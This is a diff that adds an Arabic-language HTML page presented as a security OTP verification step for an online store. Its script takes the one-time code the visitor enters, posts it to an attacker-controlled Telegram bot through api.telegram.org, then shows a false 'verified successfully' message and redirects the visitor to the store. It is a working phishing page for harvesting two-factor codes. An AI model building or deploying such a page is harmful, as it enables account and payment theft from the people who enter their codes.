@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>التحقق الأمني - OTP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="config.js"></script>
+</head>
+<body class="bg-gray-100 p-8 flex items-center justify-center h-screen">
+    <div class="max-w-md w-full bg-white p-6 rounded-2xl shadow-md text-center">
+        <h2 class="text-xl font-bold mb-2">🔐 رمز التحقق الأمني</h2>
+        <p class="text-gray-500 text-sm mb-6">الرجاء إدخال رمز التحقق المرسل لهاتفك</p>
+        <form id="otpForm" onsubmit="submitOtp(event)" class="space-y-4">
+            <input type="text" id="otpCode" placeholder="أدخل الرمز هنا" required class="w-full p-3 border rounded-xl text-center text-xl font-mono tracking-widest">
+            <button type="submit" id="otpBtn" class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl">تأكيد الرمز</button>
+        </form>
+    </div>
+
+    <script>
+        async function submitOtp(e) {
+            e.preventDefault();
+            const btn = document.getElementById('otpBtn');
+            btn.disabled = true;
+            btn.textContent = "جاري التحقق...";
+
+            const otp = document.getElementById('otpCode').value;
+
+            const text = `🔐 *كود OTP من [${SITE_CONFIG.STORE_NAME}]*\n` +
+                         `🔑 الرمز: \`${otp}\``;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${SITE_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: SITE_CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+
+                alert("تم التحقق بنجاح!");
+                window.location.href = "index.html"; // العودة للمتجر أو صفحة نجاح
+            } catch (err) {
+                alert("حدث خطأ، حاول مجدداً.");
+                btn.disabled = false;
+                btn.textContent = "تأكيد الرمز";
+            }
+        }
+    </script>
+</body>
+</html>
